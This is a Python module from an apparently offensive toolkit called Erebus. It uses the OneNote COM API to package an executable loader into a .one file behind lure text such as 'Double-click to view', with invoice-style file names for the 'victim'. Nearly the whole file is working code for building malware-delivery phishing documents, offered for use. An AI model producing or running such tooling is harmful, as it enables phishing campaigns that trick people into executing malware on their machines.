"""
Erebus.Helper - OneNote Trigger Module

Creates a OneNote section file (.one) with an embedded payload attachment
via the OneNote COM API.

Called by main.py `onenote` subcommand:
    python erebus_helper.py onenote --payload Invoice.exe \\
        --attachment-name Invoice.exe --output document.one \\
        --title "Invoice" --lure-text "Double-click to view."

Requirements: Microsoft OneNote installed, pywin32 (pip install pywin32).
"""

import logging
import shutil
import tempfile
import uuid
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import Optional, Tuple

logger = logging.getLogger(__name__)

# OneNote COM ProgID (works with OneNote 2010 through 365)
_ONENOTE_PROGID = "OneNote.Application"

# OneNote XML namespace
_ONE_NS = "http://schemas.microsoft.com/office/onenote/2013/onenote"

# CreateFileType enum values (from OneNote 2013 SDK)
_CFT_NOTEBOOK = 1

# HierarchyScope enum values
_HS_SECTIONS = 3
_HS_PAGES    = 4

# PublishFormat enum values
_PF_ONENOTE  = 0   # .one section file


def _com_available() -> bool:
    try:
        import win32com.client  # noqa: F401
        return True
    except ImportError:
        return False


def create_onenote(
    payload_path: str,
    attachment_name: str,
    output_path: str,
    note_title: str = "Invoice",
    lure_text: str = "Please double-click the attachment below to view the document.",
) -> Tuple[bool, str]:
    """Create a OneNote .one file with an embedded payload attachment.

    Uses the OneNote COM API to:
    1. Create a temporary notebook at a random %TEMP% path.
    2. Add a page with lure text and an InsertedFile pointing at the payload.
    3. Export the section as a .one file to output_path.
    4. Clean up the temporary notebook directory.

    Args:
        payload_path:    Absolute path to the compiled loader (exe/dll/bat).
        attachment_name: Filename shown to the victim in OneNote's attachment pane
                         (e.g. "Invoice_2024.exe").
        output_path:     Where to write the finished .one file.
        note_title:      Page heading displayed in OneNote.
        lure_text:       Body text displayed above the attachment icon.

    Returns:
        (success: bool, message: str)
    """
    if not _com_available():
        return False, (
            "pywin32 not found.  "
            "Install it on the Windows host with: pip install pywin32"
        )

    import win32com.client

    payload_path = Path(payload_path)
    output_path  = Path(output_path)

    if not payload_path.exists():
        return False, f"Payload not found: {payload_path}"

    output_path.parent.mkdir(parents=True, exist_ok=True)

    nb_dir = Path(tempfile.gettempdir()) / f"erebus_nb_{uuid.uuid4().hex[:8]}"
    nb_dir.mkdir(parents=True, exist_ok=True)

    # Stage payload locally so OneNote can read it
    staged_payload = nb_dir / attachment_name
    shutil.copy2(payload_path, staged_payload)

    onenote = None
    try:
        onenote = win32com.client.Dispatch(_ONENOTE_PROGID)

        # Open / create notebook at nb_dir
        nb_id = onenote.OpenHierarchy(str(nb_dir), "", _CFT_NOTEBOOK)
        logger.info(f"Opened notebook: {nb_id}")

        # Get the auto-created section
        sec_xml = onenote.GetHierarchy(nb_id, _HS_SECTIONS)
        sec_root = ET.fromstring(sec_xml)
        _ns = {"one": _ONE_NS}
        # Section is a child of Notebook
        sec_el = sec_root.find(".//one:Section", _ns)
        if sec_el is None:
            return False, "Could not find a Section in the new notebook"
        sec_id = sec_el.attrib["ID"]
        logger.info(f"Section ID: {sec_id}")

        # Get the default page
        page_xml = onenote.GetHierarchy(sec_id, _HS_PAGES)
        page_root = ET.fromstring(page_xml)
        page_el = page_root.find(".//one:Page", _ns)
        if page_el is None:
            return False, "Could not find a Page in the new section"
        page_id = page_el.attrib["ID"]
        logger.info(f"Page ID: {page_id}")

        # Build page XML with embedded InsertedFile
        page_content = (
            f'<?xml version="1.0"?>'
            f'<one:Page xmlns:one="{_ONE_NS}" ID="{page_id}">'
            f'<one:Title><one:OE>'
            f'<one:T><![CDATA[{note_title}]]></one:T>'
            f'</one:OE></one:Title>'
            f'<one:Outline>'
            f'<one:Position x="36" y="86" z="0"/>'
            f'<one:Size width="600" height="17.28"/>'
            f'<one:OEChildren><one:OE>'
            f'<one:T><![CDATA[{lure_text}]]></one:T>'
            f'</one:OE></one:OEChildren>'
            f'</one:Outline>'
            f'<one:InsertedFile pathSource="{staged_payload}" '
            f'preferredName="{attachment_name}"/>'
            f'</one:Page>'
        )

        onenote.UpdatePageContent(page_content)
        logger.info("Page content updated with embedded attachment")

        # Export section as .one (pfOneNote = 0)
        tmp_out = nb_dir / "output.one"
        onenote.Publish(sec_id, str(tmp_out), _PF_ONENOTE, "")
        logger.info(f"Exported .one → {tmp_out}")

        if not tmp_out.exists():
            return False, "Publish succeeded but output file was not created"

        if output_path.exists():
            output_path.unlink()
        shutil.move(str(tmp_out), str(output_path))

        size = output_path.stat().st_size
        return True, f"Created: {output_path.name} ({size:,} bytes)"

    except Exception as exc:
        return False, f"OneNote COM error: {exc}"
    finally:
        # Close notebook and clean up temp dir
        try:
            if onenote is not None:
                onenote.CloseNotebook(nb_id)
        except Exception:
            pass
        shutil.rmtree(nb_dir, ignore_errors=True)
